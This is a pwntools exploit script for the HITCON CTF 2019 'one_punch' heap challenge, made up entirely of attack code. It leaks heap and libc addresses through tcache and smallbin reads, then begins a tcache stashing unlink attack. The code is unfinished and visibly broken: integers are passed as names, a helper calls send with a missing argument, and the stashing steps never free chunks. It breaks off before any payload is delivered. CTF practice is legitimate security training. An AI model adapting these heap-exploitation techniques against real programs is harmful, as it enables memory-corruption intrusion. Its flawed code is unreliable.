from pwn import *
context(os="linux", arch="amd64")

DEBUG = 1
LOCAL = 1

def debug_on():
	context.log_level = "debug"

g_fname = "hitcon_ctf_2019_one_punch"
g_elf = ELF(g_fname)
g_libcname = ""

if (LOCAL):
	g_io = process(g_fname)
	g_libc = g_elf.libc
else:
	g_io = remote()
	g_libc = ELF(g_libcname)

def getpid():
	if (DEBUG & LOCAL):
		log.info("PID: %d", g_io.proc.pid)
		pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def opt(idx):
	sla("> ", str(idx))

def new(idx, name):
	opt(1)
	sla("idx: ", str(idx))
	sa("hero name: ", name)

def edit(idx, name):
	opt(2)
	sla("idx: ", str(idx))
	sa("hero name: ", name)
	
def show(idx):
	opt(3)
	sla("idx: ", str(idx))

def delete(idx):
	opt(4)
	sla("idx: ", str(idx))
	
def backdoor(content):
	opt("50056")
	sa(content)

def pwn():
	########################
	# leak libc & heap base	
	########################
	for i in range(7):
		new(0, 'a'*0x80)
		delete(0)
	show(0) # leak heap base from tcache
	ru("hero name: ")
	heap_base = u64(rl()[:-1].ljust(8, b'\0')) & 0xfffffffffffff000

	new(0, 'a'*0x80)
	new(1, 'a'*0x80)
	delete(0)
	show(0) # leak libc from smallbin 
	ru("hero name: ")
	libc_base = u64(rl()[:-1].ljust(8, b'\0')) - 0x1e4ca0
	g_libc.address = libc_base
	
	log.success("heap@%#x\nlibc@%#x", heap_base, libc_base)

	###############################
	# tcache stashing unlink attack
	###############################
	for i in range(6):
		new(0, 0xf0)
		delete(0)
	for i in range(7):
		new(1, 0x3f0)
		new(2, 0x2f0)
	
	new(1, 0x2f0)
	new(2, 0x2f0)
	delete(1) # put chunk 0x300 into unsortedbin

	new(1, 0x3f0)
	new(2, 0x3f0)
	delete(1) # put chunk 0x400 into unsortedbin
	
	# split ub to generate two 0x100 chunks.
	new(1, 0x1f0)
	new(2, 0x2f0)

if ("__main__" == __name__):
	debug_on()
	pwn()
	g_io.interactive()

